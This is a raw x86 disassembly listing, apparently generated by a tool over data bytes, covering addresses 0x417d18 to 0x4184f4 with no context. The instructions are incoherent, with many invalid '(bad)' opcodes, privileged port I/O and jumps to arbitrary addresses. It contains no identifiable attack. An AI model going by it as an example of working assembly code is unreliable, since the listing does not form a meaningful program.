  417d18:	cdq    
  417d19:	(bad)  
  417d1a:	lods   al,BYTE PTR ds:[esi]
  417d1b:	ins    BYTE PTR es:[edi],dx
  417d1c:	jbe    0x417ccb
  417d1e:	inc    esp
  417d1f:	or     eax,0xcfbbf596
  417d24:	fild   QWORD PTR [eax+0x570a7e1a]
  417d2a:	push   edi
  417d2b:	xchg   ebp,eax
  417d2c:	inc    eax
  417d2d:	stos   BYTE PTR es:[edi],al
  417d2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d2f:	mov    ah,BYTE PTR [esi]
  417d31:	jbe    0x417cbf
  417d33:	push   ss
  417d34:	int    0x4e
  417d36:	jno    0x417d46
  417d38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d39:	retf   0x4745
  417d3c:	ret    
  417d3d:	jl     0x417d8e
  417d3f:	mov    eax,0x611e964f
  417d44:	repnz nop
  417d46:	loop   0x417d32
  417d48:	pop    eax
  417d49:	es adc al,0x1d
  417d4c:	inc    eax
  417d4d:	gs sub eax,0x722d6c19
  417d53:	test   al,0x43
  417d55:	ss loop 0x417d8f
  417d58:	retf   0x8a94
  417d5b:	jg     0x417dad
  417d5d:	int    0xaa
  417d5f:	(bad)  
  417d60:	push   edx
  417d61:	dec    esi
  417d62:	imul   esp,edx,0x79db522
  417d68:	inc    esi
  417d69:	jb     0x417ddf
  417d6b:	in     al,dx
  417d6c:	call   0xac727b56
  417d71:	cs call 0x450b:0xc07786b
  417d79:	cli    
  417d7a:	xchg   edx,eax
  417d7b:	push   eax
  417d7c:	lds    eax,FWORD PTR [ebp-0x2d]
  417d7f:	fimul  DWORD PTR [esp+ebp*8]
  417d82:	sbb    al,0x39
  417d84:	out    0x85,al
  417d86:	mov    bh,0x3d
  417d88:	push   ebx
  417d89:	mov    ecx,0x3aa9a521
  417d8e:	or     dh,BYTE PTR [edi-0x7105e76a]
  417d94:	bnd jp 0x417df3
  417d97:	cdq    
  417d98:	int    0xdf
  417d9a:	and    ah,0xf5
  417d9d:	aad    0x2a
  417d9f:	outs   dx,DWORD PTR ds:[esi]
  417da0:	popf   
  417da1:	in     eax,dx
  417da2:	adc    BYTE PTR [ebx+0x62],bl
  417da5:	inc    edi
  417da6:	mov    bh,0x9e
  417da8:	cmp    al,0x15
  417daa:	pop    ebx
  417dab:	aas    
  417dac:	clc    
  417dad:	inc    ebp
  417dae:	(bad)  
  417daf:	pop    edi
  417db0:	(bad)  
  417db1:	sbb    ebp,esi
  417db3:	mov    ds:0x11a12000,eax
  417db8:	adc    bl,al
  417dba:	inc    esp
  417dbb:	push   ebp
  417dbc:	cli    
  417dbd:	pop    eax
  417dbe:	push   0x1
  417dc0:	cmc    
  417dc1:	mov    esi,DWORD PTR [eax-0xab2d401]
  417dc7:	cmp    BYTE PTR [edx-0x17],al
  417dca:	and    al,0x93
  417dcc:	(bad)  
  417dcd:	fbld   TBYTE PTR ss:[edi+0x77652a4a]
  417dd4:	test   al,0xe1
  417dd6:	out    dx,eax
  417dd7:	nop
  417dd8:	scas   eax,DWORD PTR es:[edi]
  417dd9:	(bad)  
  417dda:	xor    al,0xc5
  417ddc:	int3   
  417ddd:	(bad)
  417de0:	and    BYTE PTR [ebp-0x9],ah
  417de3:	outs   dx,DWORD PTR ds:[esi]
  417de4:	nop
  417de5:	mov    ah,0x2f
  417de7:	mov    BYTE PTR [ecx-0x4c],0x1a
  417deb:	movlps xmm5,QWORD PTR [eax]
  417dee:	or     BYTE PTR [eax+0x64],cl
  417df1:	pop    es
  417df2:	sub    dh,BYTE PTR [eax+esi*4]
  417df5:	nop
  417df6:	mov    al,0x15
  417df8:	xor    BYTE PTR [ebx-0x6aba6f23],bl
  417dfe:	les    ebp,FWORD PTR [ebp+0x2b]
  417e01:	mov    dl,0x59
  417e03:	fcomi  st,st(2)
  417e05:	lea    ebp,gs:[ebx]
  417e08:	aas    
  417e09:	ja     0x417dcd
  417e0b:	popa   
  417e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e0d:	in     eax,0xda
  417e0f:	loope  0x417dc4
  417e11:	and    cl,BYTE PTR [ebp+eiz*1-0x1e]
  417e15:	out    0x95,eax
  417e17:	inc    edx
  417e18:	mov    dl,BYTE PTR [edi]
  417e1a:	or     al,0x15
  417e1c:	test   eax,0x4fe5c787
  417e21:	xchg   esp,eax
  417e22:	into   
  417e23:	in     eax,0x26
  417e25:	cmp    ecx,edx
  417e27:	xor    DWORD PTR [edx-0x38797d53],edi
  417e2d:	es retf 0xd664
  417e31:	lock lods eax,DWORD PTR ds:[esi]
  417e33:	and    edx,DWORD PTR [edx]
  417e35:	sbb    DWORD PTR [ecx+0x60],esp
  417e38:	and    eax,0xe00d9304
  417e3d:	jg     0x417dc7
  417e3f:	dec    esi
  417e40:	shl    al,0x4f
  417e43:	cmp    eax,0x99626bae
  417e48:	jmp    0x417e68
  417e4a:	test   bh,ch
  417e4c:	cmp    dl,BYTE PTR [edx+0x7469df74]
  417e52:	je     0x417e21
  417e54:	fnstsw WORD PTR [eax-0x78a12d15]
  417e5a:	xor    esp,esi
  417e5c:	sti    
  417e5d:	call   0x8d270beb
  417e62:	dec    ebx
  417e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e64:	sbb    ebx,DWORD PTR [ebx]
  417e66:	pop    DWORD PTR [edx+0x34]
  417e69:	das    
  417e6a:	push   ds
  417e6b:	aas    
  417e6c:	int    0x5
  417e6e:	rcl    BYTE PTR [ebx+eiz*1],1
  417e71:	push   eax
  417e72:	lea    eax,[ebp-0x42]
  417e75:	icebp  
  417e76:	enter  0x4c56,0xd5
  417e7a:	pusha  
  417e7b:	dec    eax
  417e7c:	sub    DWORD PTR [edx],ebp
  417e7e:	jp     0x417ec8
  417e80:	loopne 0x417e29
  417e82:	jmp    0x417ebd
  417e84:	test   al,0x6c
  417e86:	sub    BYTE PTR [ebx-0x70b7757],al
  417e8c:	pop    edi
  417e8d:	push   eax
  417e8e:	xor    BYTE PTR [ebx-0x62604306],0x5f
  417e95:	scas   al,BYTE PTR es:[edi]
  417e96:	into   
  417e97:	fistp  QWORD PTR [edi]
  417e99:	xor    edi,0xfffffff5
  417e9c:	enter  0xb2f2,0xe3
  417ea0:	int3   
  417ea1:	or     esi,DWORD PTR [edi]
  417ea3:	ror    BYTE PTR [eax-0x58],cl
  417ea6:	dec    esp
  417ea7:	add    eax,0xe25f4be9
  417eac:	push   edx
  417ead:	cmc    
  417eae:	jnp    0x417f0f
  417eb0:	pop    esp
  417eb1:	push   cs
  417eb2:	push   cs
  417eb3:	dec    edi
  417eb4:	cmp    eax,0x6193e4b4
  417eb9:	mov    edi,0xc148fcc
  417ebe:	inc    edi
  417ebf:	pop    eax
  417ec0:	adc    DWORD PTR [edi+eiz*4+0x6b],ebx
  417ec4:	adc    dl,BYTE PTR [esp+ecx*1+0x61963bef]
  417ecb:	outs   dx,DWORD PTR ds:[esi]
  417ecc:	lahf   
  417ecd:	push   0x32f1dfe6
  417ed2:	(bad)  
  417ed3:	sub    eax,0xa12b252b
  417ed8:	outs   dx,DWORD PTR ds:[esi]
  417ed9:	scas   al,BYTE PTR es:[edi]
  417eda:	das    
  417edb:	dec    esp
  417edc:	and    DWORD PTR [edx-0x35],0x548c5635
  417ee3:	pop    ds
  417ee4:	std    
  417ee5:	js     0x417f5c
  417ee7:	or     eax,0xf71b231e
  417eec:	jmp    0x277dc5e1
  417ef1:	pop    es
  417ef2:	jle    0x417eaf
  417ef4:	sar    esi,1
  417ef6:	inc    eax
  417ef7:	fnstsw WORD PTR [edx-0x3a2e07ce]
  417efd:	inc    esi
  417efe:	push   esp
  417eff:	les    edx,FWORD PTR [ebp+0x28]
  417f02:	cmp    BYTE PTR [ebx+0x6aaffc55],dl
  417f08:	aas    
  417f09:	or     BYTE PTR [edi-0x12d5ed81],bl
  417f0f:	mov    bl,BYTE PTR [esp+edi*4-0x1a]
  417f13:	fidiv  DWORD PTR [eax+ecx*2]
  417f16:	ror    BYTE PTR [edi+ebx*2-0x55],0xec
  417f1b:	jmp    0x417f03
  417f1d:	pop    eax
  417f1e:	sbb    al,0x88
  417f20:	into   
  417f21:	dec    ebx
  417f22:	mov    edx,0x1a182b8f
  417f27:	imul   eax,esi,0xcf7d9fe0
  417f2d:	je     0x417ee4
  417f2f:	div    BYTE PTR [ecx+0x5a]
  417f32:	aam    0xcd
  417f34:	stc    
  417f35:	cs in  al,dx
  417f37:	ins    BYTE PTR es:[edi],dx
  417f38:	(bad)  
  417f39:	xor    eax,0xce39ee6b
  417f3e:	mov    al,0x94
  417f40:	adc    ah,bh
  417f42:	retf   
  417f43:	adc    DWORD PTR [edi-0x45c7ee09],ecx
  417f49:	jnp    0x417f83
  417f4b:	push   cs
  417f4c:	loop   0x417f6f
  417f4e:	mov    al,ds:0x87f73113
  417f53:	mov    edx,0xb882dd14
  417f58:	cmp    DWORD PTR [edx+0x51a3e624],eax
  417f5e:	mov    al,0x30
  417f60:	dec    esp
  417f61:	mov    ch,0x76
  417f63:	cmp    BYTE PTR [edi+0x57623557],bl
  417f69:	out    0x60,eax
  417f6b:	mov    ebx,0x412e110f
  417f70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f71:	xchg   edx,eax
  417f72:	dec    ecx
  417f73:	iret   
  417f74:	sub    eax,0xd5ef2f7f
  417f79:	xor    eax,0x8f743977
  417f7e:	mov    cl,0xde
  417f80:	inc    edi
  417f81:	xchg   edi,eax
  417f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f83:	(bad)  
  417f84:	jmp    0xf719:0x9700a8a5
  417f8b:	loope  0x417f59
  417f8d:	mov    cl,0x6e
  417f8f:	add    al,0x5b
  417f91:	inc    esi
  417f92:	addr16 inc edx
  417f94:	out    0xa6,al
  417f96:	xchg   esi,eax
  417f97:	mov    ebx,ebp
  417f99:	test   edx,0xe8683047
  417f9f:	test   dl,0x0
  417fa2:	and    BYTE PTR [ebx+0x445528ab],bl
  417fa8:	sbb    al,0x22
  417faa:	loop   0x418019
  417fac:	into   
  417fad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fae:	cdq    
  417faf:	sbb    DWORD PTR [ecx-0x2b0c37cf],0xffffff9b
  417fb6:	sahf   
  417fb7:	adc    al,0x77
  417fb9:	xor    al,0x36
  417fbb:	(bad)  
  417fbc:	mov    ebx,0xb9350819
  417fc1:	push   ecx
  417fc2:	add    DWORD PTR [ebx+0x1f1b18cd],edx
  417fc8:	mov    dl,0xc8
  417fca:	sbb    BYTE PTR [edx-0x29464b5a],ch
  417fd0:	pop    ebx
  417fd1:	(bad)  
  417fd2:	(bad)  
  417fd3:	mov    ch,0xc3
  417fd5:	adc    BYTE PTR [eax-0x18],bl
  417fd8:	retf   
  417fd9:	mov    cr5,edx
  417fdc:	aaa    
  417fdd:	out    dx,al
  417fde:	lahf   
  417fdf:	fwait
  417fe0:	addr16 adc dl,al
  417fe3:	jge    0x417f68
  417fe5:	pop    esp
  417fe6:	out    dx,eax
  417fe7:	(bad)  
  417fe8:	repz or eax,0xe5f53c4f
  417fee:	and    al,0xc
  417ff0:	dec    edi
  417ff1:	pop    edi
  417ff2:	sbb    BYTE PTR [edx-0x73963e6d],bl
  417ff8:	xchg   esi,eax
  417ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ffa:	or     ecx,DWORD PTR [eax+0x6893a037]
  418000:	dec    ebp
  418001:	and    eax,DWORD PTR [esi]
  418003:	out    0x3,al
  418005:	and    al,0x50
  418007:	add    esp,DWORD PTR [edx+eax*4]
  41800a:	loope  0x41805f
  41800c:	inc    edi
  41800d:	repnz out 0x48,al
  418010:	imul   eax,DWORD PTR [eax-0x7d],0xffffffab
  418014:	fdiv   QWORD PTR [ecx+0x20f70f1b]
  41801a:	repz push cs
  41801c:	arpl   WORD PTR [ecx+ebx*2+0x4b052937],bx
  418023:	cs mov eax,0x3b42b1da
  418029:	lods   eax,DWORD PTR ds:[esi]
  41802a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41802b:	jbe    0x418088
  41802d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41802e:	mov    ecx,DWORD PTR [ecx-0x65]
  418031:	jg     0x41805d
  418033:	stc    
  418034:	mov    ecx,0xaa6c9783
  418039:	jb     0x417ffa
  41803b:	jge    0x418022
  41803d:	inc    ebx
  41803e:	and    dl,BYTE PTR [eax]
  418040:	sub    DWORD PTR [edx+0x36],esi
  418043:	sbb    eax,0x5b75f579
  418048:	jae    0x418037
  41804a:	jno    0x418052
  41804c:	xchg   edx,eax
  41804d:	dec    esi
  41804e:	fdiv   DWORD PTR [edi+ebx*8+0x47]
  418052:	mov    ebx,0x3291936f
  418057:	fcomp  DWORD PTR [eax]
  418059:	sub    BYTE PTR [eax-0x6975f19f],bh
  41805f:	push   edi
  418060:	ficom  WORD PTR [eax+esi*8]
  418063:	cmp    DWORD PTR [ecx],ebp
  418065:	int3   
  418066:	and    cl,al
  418068:	int3   
  418069:	and    eax,0xaa96725d
  41806e:	out    0xde,al
  418070:	push   ebx
  418071:	dec    edi
  418072:	sbb    eax,0xfc31c1f2
  418077:	push   ss
  418078:	xor    al,0xc3
  41807a:	aas    
  41807b:	mov    edx,0xc5d21484
  418080:	lods   eax,DWORD PTR ds:[esi]
  418081:	pop    esi
  418082:	in     eax,0x6d
  418084:	sti    
  418085:	mov    ds:0x6fda96d0,al
  41808a:	sar    BYTE PTR ds:0x2e4dda06,cl
  418090:	xchg   DWORD PTR [edi+0x4859a539],ebp
  418096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418097:	cmc    
  418098:	sti    
  418099:	adc    al,0x32
  41809b:	call   0x85f99b8f
  4180a0:	mov    BYTE PTR cs:[ebx+0x7a13be1f],0x3d
  4180a8:	stos   DWORD PTR es:[edi],eax
  4180a9:	ins    DWORD PTR es:[edi],dx
  4180aa:	or     DWORD PTR [edi-0x11],eax
  4180ad:	loopne 0x418043
  4180af:	popa   
  4180b0:	in     eax,dx
  4180b1:	adc    ebp,edi
  4180b3:	adc    cl,BYTE PTR [bp+0x4f]
  4180b7:	xchg   edi,eax
  4180b8:	jo     0x4180e9
  4180ba:	adc    ebp,ecx
  4180bc:	xchg   ebp,eax
  4180bd:	dec    ecx
  4180be:	ja     0x418127
  4180c0:	out    dx,eax
  4180c1:	jle    0x4180c1
  4180c3:	or     esi,ecx
  4180c5:	dec    ebx
  4180c6:	mov    esi,0x609d6ea0
  4180cb:	cmp    eax,0x83eba89b
  4180d0:	aaa    
  4180d1:	xlat   BYTE PTR ds:[ebx]
  4180d2:	inc    edx
  4180d3:	enter  0x5170,0x9
  4180d7:	or     al,0xb0
  4180d9:	xor    eax,0x135e8a53
  4180de:	imul   ecx,DWORD PTR [esi+eax*4+0x16c24b2b],0x42
  4180e6:	mov    ecx,DWORD PTR [edx+ebx*1]
  4180e9:	and    ebx,DWORD PTR [esi+0x12]
  4180ec:	jo     0x418105
  4180ee:	sub    cl,BYTE PTR [esi]
  4180f0:	xchg   DWORD PTR fs:[edx-0x302f4e40],ebx
  4180f7:	sahf   
  4180f8:	rol    esp,1
  4180fa:	cmp    BYTE PTR [esp+ecx*8-0x34],dl
  4180fe:	(bad)  [edi+0x3b84b4f3]
  418104:	fidivr WORD PTR [ebp+0x73e408aa]
  41810a:	push   eax
  41810b:	setns  BYTE PTR [edx]
  41810e:	dec    edi
  41810f:	int3   
  418110:	xor    dh,bh
  418112:	sti    
  418113:	jle    0x4180a8
  418115:	loopne 0x4180b2
  418117:	nop
  418118:	pop    es
  418119:	mov    eax,ds:0xad6763ff
  41811e:	xor    dl,BYTE PTR [esi+ebp*2+0x50]
  418122:	jae    0x4180aa
  418124:	(bad)  
  418125:	fst    DWORD PTR [ecx-0x69]
  418128:	ret    
  418129:	mov    bl,0xac
  41812b:	push   0x20
  41812d:	shl    BYTE PTR [edi+esi*2],cl
  418130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418131:	mov    eax,ds:0xe9e86c0d
  418136:	pop    ebp
  418137:	adc    dh,al
  418139:	int3   
  41813a:	mov    dl,0xa4
  41813c:	fisubr DWORD PTR [esi-0x15]
  41813f:	jp     0x418113
  418141:	sub    BYTE PTR [ebp+ebx*1-0x22],dh
  418145:	ins    DWORD PTR es:[edi],dx
  418146:	cli    
  418147:	mov    cl,0x80
  418149:	inc    eax
  41814a:	xor    al,0xe7
  41814c:	xchg   edi,eax
  41814d:	aaa    
  41814e:	mov    ebx,0x41867534
  418153:	jo     0x418145
  418155:	popa   
  418156:	popa   
  418157:	inc    edi
  418158:	xchg   edi,eax
  418159:	fs mov ecx,0x1740e21d
  41815f:	pop    edi
  418160:	add    eax,DWORD PTR [edx-0xc]
  418163:	fisttp QWORD PTR [edi]
  418165:	mov    esp,0x7b7d4d9
  41816a:	out    dx,al
  41816b:	pop    ebx
  41816c:	pop    eax
  41816d:	inc    edi
  41816e:	scas   al,BYTE PTR es:[edi]
  41816f:	icebp  
  418170:	xchg   BYTE PTR [ecx+0x1dbd8b71],cl
  418176:	sub    DWORD PTR [esi],esp
  418178:	int    0x1d
  41817a:	jno    0x41819f
  41817c:	outs   dx,BYTE PTR ds:[esi]
  41817d:	inc    esp
  41817e:	jns    0x4181f8
  418180:	inc    edx
  418181:	stos   DWORD PTR es:[edi],eax
  418182:	sbb    BYTE PTR [esi],dl
  418184:	mov    edi,0x1135633
  418189:	inc    ecx
  41818a:	cmc    
  41818b:	ficom  DWORD PTR [ecx-0x4749b1b5]
  418191:	lock fucompp 
  418194:	jno    0x41815d
  418196:	push   esp
  418197:	or     ch,bl
  418199:	dec    edx
  41819a:	cmp    eax,eax
  41819c:	jo     0x41818a
  41819e:	out    dx,eax
  41819f:	mov    eax,ds:0xa4b5b92f
  4181a4:	mov    DWORD PTR [edx+0x2f],eax
  4181a7:	push   0xffffffb6
  4181a9:	cmp    ecx,edi
  4181ab:	shl    BYTE PTR [ecx],1
  4181ad:	fsubr  QWORD PTR [ebx-0x4c4adeca]
  4181b3:	push   esi
  4181b4:	push   cs
  4181b5:	sar    BYTE PTR [esi+0x660eb22e],cl
  4181bb:	(bad)  
  4181bc:	loop   0x418156
  4181be:	in     al,0xa1
  4181c0:	loop   0x4181c5
  4181c2:	push   edi
  4181c3:	and    eax,0x135584b6
  4181c8:	inc    edx
  4181c9:	jb     0x4181df
  4181cb:	push   0x1f
  4181cd:	aaa    
  4181ce:	xchg   DWORD PTR [edi+0xb],ecx
  4181d1:	add    BYTE PTR [ebp+0x44],dl
  4181d4:	ins    DWORD PTR es:[edi],dx
  4181d5:	cmc    
  4181d6:	sub    dh,BYTE PTR [esi+eax*4+0x5a8ffc58]
  4181dd:	lds    esi,FWORD PTR [edi-0x44]
  4181e0:	bound  edx,QWORD PTR [edx-0x15a28f3]
  4181e6:	mov    ebp,0xfb3b00de
  4181eb:	fsub   DWORD PTR [ecx+0xbbaf5e3]
  4181f1:	call   0xa1a29fa
  4181f6:	pushf  
  4181f7:	xor    esi,DWORD PTR [ecx]
  4181f9:	mov    al,0xba
  4181fb:	add    al,0x53
  4181fd:	mov    bl,0xde
  4181ff:	ja     0x4181d0
  418201:	stc    
  418202:	or     dl,BYTE PTR [edx+ebx*8-0x51]
  418206:	sbb    al,0x91
  418208:	sbb    al,0x1e
  41820a:	jecxz  0x418260
  41820c:	or     ebx,ebp
  41820e:	(bad)  
  418210:	jae    0x418212
  418212:	xchg   ebp,eax
  418213:	(bad)  
  418214:	in     eax,0x22
  418216:	push   ebp
  418217:	ins    DWORD PTR es:[edi],dx
  418218:	fsubr  QWORD PTR [ecx+0x14]
  41821b:	shr    BYTE PTR [ebp+0x63],0x30
  41821f:	and    eax,0x94548820
  418224:	bound  esp,QWORD PTR [ecx+ebx*4+0x35]
  418228:	mov    esi,DWORD PTR [edx+0x3]
  41822b:	call   0xa03:0xb9f2003b
  418232:	repnz add esp,ecx
  418235:	mov    ds:0x343fe769,eax
  41823a:	cmp    eax,0xaad714f8
  41823f:	das    
  418240:	push   0xffffffac
  418242:	cmp    BYTE PTR [ecx-0x60],ch
  418245:	ss mov edi,cs
  418248:	add    esi,DWORD PTR [ebx]
  41824a:	loope  0x4182a2
  41824c:	enter  0x3524,0x86
  418250:	pop    edi
  418251:	add    eax,0x3ebff9dd
  418256:	fistp  QWORD PTR ss:[esi+edx*1+0x66]
  41825b:	jg     0x418270
  41825d:	int3   
  41825e:	bnd jns 0x41820a
  418261:	dec    edx
  418262:	sahf   
  418263:	adc    eax,0x6ee45f02
  418268:	xor    al,BYTE PTR [eax+0x6dca813d]
  41826e:	xor    al,dh
  418270:	mov    eax,0x656b867f
  418275:	dec    ecx
  418276:	leave  
  418277:	jno    0x41829f
  418279:	sbb    DWORD PTR [edx],0xe7f38d7f
  41827f:	mov    edi,0xf6d61cc2
  418284:	mov    dl,0x82
  418286:	dec    eax
  418287:	add    eax,0xf906ea72
  41828c:	(bad)  
  41828d:	(bad)  
  41828e:	into   
  41828f:	jle    0x418214
  418291:	icebp  
  418292:	cmp    al,0xd1
  418294:	jae    0x4182aa
  418296:	les    edx,FWORD PTR [ecx+eax*8-0x70]
  41829a:	lods   al,BYTE PTR cs:[esi]
  41829c:	xchg   ebp,eax
  41829d:	jmp    0x9350:0xf42992a6
  4182a4:	sbb    ecx,0x94c09197
  4182aa:	mov    ecx,0x2d3266ca
  4182af:	out    0x9a,al
  4182b1:	or     al,0x8c
  4182b3:	jb     0x4182ac
  4182b5:	mov    edi,ecx
  4182b7:	sub    al,0x3e
  4182b9:	push   ss
  4182ba:	js     0x4182bc
  4182bc:	push   ebp
  4182bd:	jg     0x4182a9
  4182bf:	xchg   esi,eax
  4182c0:	jmp    0xa96:0x134982
  4182c7:	dec    esi
  4182c8:	mov    bh,0x5
  4182ca:	push   eax
  4182cb:	push   edx
  4182cc:	xchg   edi,eax
  4182cd:	jo     0x41834a
  4182cf:	ja     0x4182f5
  4182d1:	aam    0xba
  4182d3:	sub    BYTE PTR [esi-0x508ccb7d],bl
  4182d9:	add    al,0x84
  4182db:	popa   
  4182dc:	fwait
  4182dd:	add    ch,bl
  4182df:	add    esp,DWORD PTR [eax+0x781fff49]
  4182e5:	dec    ecx
  4182e6:	push   ds
  4182e7:	data16 leavew 
  4182ea:	mov    esi,0xdcad54cc
  4182ef:	jl     0x41827d
  4182f1:	mov    ds:0xf97ad577,al
  4182f6:	das    
  4182f7:	jne    0x41831f
  4182f9:	loop   0x41832c
  4182fb:	sbb    edx,DWORD PTR ds:0xe5af59bc
  418301:	inc    ebx
  418302:	mov    ah,0xad
  418304:	(bad)  
  418305:	in     al,0x68
  418307:	mov    ch,0x35
  418309:	cmp    edx,esi
  41830b:	adc    bl,BYTE PTR [edx+0x49]
  41830e:	outs   dx,BYTE PTR ds:[esi]
  41830f:	mov    ebp,0x9ac2630e
  418314:	push   0xffffffd1
  418316:	or     BYTE PTR [ebx+edx*4],ah
  418319:	loop   0x418313
  41831b:	xlat   BYTE PTR ds:[ebx]
  41831c:	ja     0x418308
  41831e:	xor    BYTE PTR [ecx],0x39
  418321:	retf   0xbbb8
  418324:	fdiv   st,st(6)
  418326:	adc    eax,0x643834fe
  41832b:	mov    ch,0x64
  41832d:	xor    DWORD PTR [edx+0x31],edi
  418330:	out    dx,al
  418331:	rcl    BYTE PTR [esi-0x2d4ec526],cl
  418337:	ror    BYTE PTR [esi-0x2c],0x89
  41833b:	xchg   ebp,eax
  41833c:	fcom   DWORD PTR [ecx-0x57]
  41833f:	add    BYTE PTR [esp+eax*4-0x6505d517],0x24
  418347:	mov    esi,0xd64e22d6
  41834c:	out    dx,eax
  41834d:	xchg   DWORD PTR [ecx-0x534be9b4],esi
  418353:	test   eax,0xa6d3b25e
  418358:	adc    al,0x35
  41835a:	jecxz  0x4183bb
  41835c:	test   edx,ebx
  41835e:	aas    
  41835f:	mov    esi,0x9e415e17
  418364:	inc    ecx
  418365:	mov    ebp,0x1b73825e
  41836a:	jno    0x418389
  41836c:	cmp    DWORD PTR [ebx+0x42],esp
  41836f:	int3   
  418370:	mov    DWORD PTR [ecx],esp
  418372:	out    0xa3,eax
  418374:	cmp    DWORD PTR [edi-0x4ac525a8],edi
  41837a:	inc    ebx
  41837b:	add    DWORD PTR [ebx-0x1da2f485],edx
  418381:	std    
  418382:	lea    ecx,[ebp-0x313c2f30]
  418388:	and    dl,BYTE PTR [esi+0x209de532]
  41838e:	addr16 in al,dx
  418390:	sub    DWORD PTR [eax-0x6d5572bd],esi
  418396:	stc    
  418397:	jg     0x418340
  418399:	cmp    edi,DWORD PTR [edx]
  41839b:	mov    al,0xb2
  41839d:	sbb    ecx,esp
  41839f:	cwde   
  4183a0:	ja     0x4183c0
  4183a2:	mov    esi,?
  4183a4:	mov    cl,BYTE PTR [edx]
  4183a6:	enter  0x1ad9,0x7b
  4183aa:	add    eax,DWORD PTR [ebx-0x35]
  4183ad:	les    esi,FWORD PTR [ebp-0x32]
  4183b0:	test   BYTE PTR [edx+eax*1-0x1a68454a],0xb3
  4183b8:	bound  edi,QWORD PTR ds:0xc7348989
  4183be:	arpl   WORD PTR [edi+0x60a11020],dx
  4183c4:	imul   ebp,eax,0x87038b17
  4183ca:	ficomp DWORD PTR ds:0x78326df6
  4183d1:	cmp    BYTE PTR [eax-0x4],bl
  4183d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183d5:	mov    edx,0x3ac3633d
  4183da:	iret   
  4183db:	mov    ds:0x5ebeffe4,eax
  4183e0:	cdq    
  4183e1:	popa   
  4183e2:	mov    ds:0xe5f1cc94,al
  4183e7:	or     cl,dl
  4183e9:	mov    edi,?
  4183eb:	mov    ebx,0x86c06866
  4183f0:	lock mov dl,0xd9
  4183f3:	fisttp QWORD PTR [eax-0x61]
  4183f6:	iret   
  4183f7:	(bad)  
  4183f8:	jns    0x41846b
  4183fa:	mov    eax,0x8375bca
  4183ff:	and    DWORD PTR [eiz*8+0x59446dea],esp
  418406:	xlat   BYTE PTR ds:[ebx]
  418407:	mov    esi,0x6da72598
  41840c:	push   esp
  41840d:	jnp    0x418392
  41840f:	xor    al,0x20
  418411:	dec    ebx
  418412:	comiss xmm4,DWORD PTR [eax+0x45]
  418416:	inc    edi
  418417:	push   cs
  418418:	lods   al,BYTE PTR ds:[esi]
  418419:	sub    ah,cl
  41841b:	(bad)  
  41841c:	xlat   BYTE PTR ds:[ebx]
  41841d:	hlt    
  41841e:	inc    ebx
  41841f:	xchg   esp,eax
  418420:	call   0x2c978f2
  418425:	js     0x41844e
  418427:	push   0xb98e4ce9
  41842c:	add    edx,DWORD PTR [edi-0x4a]
  41842f:	adc    al,0xf
  418431:	xchg   BYTE PTR [esi-0x58726006],al
  418437:	outs   dx,BYTE PTR ds:[esi]
  418438:	xchg   edx,eax
  418439:	jae    0x418494
  41843b:	hlt    
  41843c:	shl    BYTE PTR [edx+0x62],0x8b
  418440:	pop    ecx
  418441:	jmp    0x4183fd
  418443:	and    BYTE PTR [ecx],0xcb
  418446:	xlat   BYTE PTR ds:[ebx]
  418447:	dec    edx
  418448:	push   esi
  418449:	in     eax,0x5b
  41844b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41844c:	aad    0x4a
  41844e:	pop    eax
  41844f:	ja     0x4183ef
  418451:	repnz pop ecx
  418453:	push   esp
  418454:	xchg   esi,eax
  418455:	clc    
  418456:	test   eax,0x8b4646
  41845b:	and    edi,DWORD PTR [ebx-0x11]
  41845e:	mov    dl,BYTE PTR [ecx-0x63890cc6]
  418464:	sti    
  418465:	and    al,0xfe
  418467:	add    edx,DWORD PTR ds:0x992170e9
  41846d:	bound  esp,QWORD PTR [eax]
  41846f:	xchg   BYTE PTR [edx-0x697f6e7c],al
  418475:	xor    al,0xee
  418477:	aam    0x3a
  418479:	jle    0x418496
  41847b:	push   edx
  41847c:	lea    esi,[edx-0x6f8c4c67]
  418482:	fwait
  418483:	pusha  
  418484:	jge    0x41847e
  418486:	jno    0x41843b
  418488:	pushf  
  418489:	add    dl,BYTE PTR [esi+eiz*1-0x27]
  41848d:	add    al,0x86
  41848f:	sub    esi,DWORD PTR [ebp-0x2b663e86]
  418495:	js     0x418427
  418497:	(bad)  
  418499:	inc    ecx
  41849a:	bound  ebx,QWORD PTR [ecx-0x3b9008a2]
  4184a0:	cmpxchg ch,bh
  4184a3:	ja     0x418506
  4184a5:	mov    ebx,0x386ffda9
  4184aa:	xchg   ebp,eax
  4184ab:	addr16 jno 0x41850f
  4184ae:	stos   BYTE PTR es:[edi],al
  4184af:	mov    bh,0xa
  4184b1:	sbb    cl,dh
  4184b3:	jp     0x418449
  4184b5:	xor    cl,BYTE PTR [ebp+eiz*8+0x33136bea]
  4184bc:	fist   WORD PTR [ebp+0x7fe32692]
  4184c2:	push   0x16
  4184c4:	jmp    0x4184ed
  4184c6:	jns    0x4184fe
  4184c8:	pop    edi
  4184c9:	push   ebx
  4184ca:	fnop   
  4184cc:	push   edi
  4184cd:	outs   dx,DWORD PTR ds:[esi]
  4184ce:	cdq    
  4184cf:	add    esi,DWORD PTR [edi+0x1f447fba]
  4184d5:	adc    eax,0xdab44527
  4184da:	xor    ch,BYTE PTR [esp+ecx*1-0x3a7a771d]
  4184e1:	adc    esi,DWORD PTR [edx-0x219213fd]
  4184e7:	push   esp
  4184e8:	in     al,dx
  4184e9:	mov    ah,0xf9
  4184eb:	loopne 0x41855a
  4184ed:	mov    ah,0x6
  4184ef:	pop    edx
  4184f0:	push   ecx
  4184f1:	jp     0x418568
  4184f3:	inc    ebp
  4184f4:	inc    esi
